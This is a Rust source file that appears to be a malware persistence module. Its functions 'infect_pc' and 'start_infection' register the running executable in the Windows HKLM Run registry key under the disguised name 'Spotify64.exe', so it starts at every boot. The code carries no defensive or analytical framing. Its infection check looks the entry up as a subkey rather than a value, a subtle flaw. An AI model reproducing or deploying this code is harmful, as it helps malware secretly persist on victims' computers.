extern crate winreg;

use std::path::{PathBuf, Path};
use std::env::{current_exe, consts::OS};
use winreg::enums::*;
use winreg::RegKey;

fn infect_pc(){
    let current_path: PathBuf = current_exe().unwrap();
    match OS{
        "windows" => {
            let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
            let path = Path::new("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
            let (key, disp) = hklm.create_subkey(&path).unwrap();
        
            let _ = key.set_value("Spotify64.exe", &current_path.into_os_string().into_string().unwrap());

    },
        "linux" => (),
        "macos" => (),
        _ => {}
    }
}

fn check_infection() -> bool{
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let path = Path::new("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Spotify64.exe");

    if hklm.open_subkey(&path).is_err(){ return false; } 
    return true;
}

pub fn start_infection(){
    if !check_infection(){ infect_pc(); }
}